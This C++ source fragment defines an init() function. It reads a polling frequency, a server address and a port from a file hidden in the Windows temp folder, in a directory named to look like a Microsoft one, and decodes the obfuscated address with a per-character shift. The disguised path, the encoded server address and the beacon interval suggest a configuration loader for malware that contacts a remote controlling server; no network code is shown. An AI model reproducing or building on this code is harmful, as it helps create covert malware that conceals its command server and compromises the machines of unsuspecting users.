#include "MSConfig.h"

void init(int& freq, char* serverAddr, char *serverPort)
{

     char fillin[128], buffer[1024], *tok;
     int cc;
     GetTempPath(1024, buffer);
     strcat(buffer, "Microsoft_9021784367548932\\Temp\\Parameters.db");
     ifstream params(buffer);
     if (!params) freq = DEF_FREQ;
     else
     {
         for (int i = 1 ; i <= 3 ; i ++) params.getline(fillin, 64);
         tok = strtok(fillin, " ");
         tok = strtok(NULL, " ");
         freq = atoi(tok);
         params.getline(fillin, 64);
         tok = strtok(fillin, " ");
         tok = strtok(NULL, " ");
         for (cc = 0 ; cc < strlen(tok) ; cc ++) tok[cc] = tok[cc] + 1 + cc;
         strncpy(serverAddr, tok, 64);
         params.getline(fillin, 64);
         tok = strtok(fillin, " ");
         tok = strtok(NULL, " ");
         strncpy(serverPort, tok, 64);
     }
          
     return;
}
